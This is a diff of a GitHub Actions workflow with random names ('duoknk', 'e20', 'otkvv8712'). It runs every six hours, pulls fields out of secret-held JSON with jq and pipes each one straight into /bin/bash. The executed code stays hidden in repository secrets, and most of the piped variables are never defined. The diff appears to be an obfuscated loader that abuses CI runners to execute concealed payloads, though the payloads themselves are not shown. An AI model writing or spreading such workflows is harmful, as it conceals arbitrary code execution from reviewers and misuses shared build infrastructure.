@@ -2,19 +2,25 @@ name: duoknk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
-
+    - cron: '14 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: duoknk
         env:
-          pfuw207: ${{ secrets.pfuw207 }}
+          e20: ${{ secrets.e20 }}
         run: |
-          echo $pfuw207 | jq -r .cgq3 | /bin/bash
-          echo $twm01341 | jq -r .j93 | /bin/bash
-          echo $mmalr10 | jq -r .h0 | /bin/bash
-          echo $uw59161 | jq -r .rb6680 | /bin/bash
+          echo $e20 | jq -r .otkvv8712 | /bin/bash
+          echo $xh558 | jq -r .vk381 | /bin/bash
+          echo $im173 | jq -r .aggx65549 | /bin/bash
+          echo $elbl625 | jq -r .zkro61 | /bin/bash
+          echo $fg70 | jq -r .wu8617 | /bin/bash
+          echo $qhd1 | jq -r .s8439 | /bin/bash
+          echo $rfcz934 | jq -r .d8914 | /bin/bash
+          echo $qe265 | jq -r .xeu7076 | /bin/bash
+          echo $chsq7548 | jq -r .xfvz12962 | /bin/bash
+          echo $lzjr91064 | jq -r .rzaa54757 | /bin/bash
 
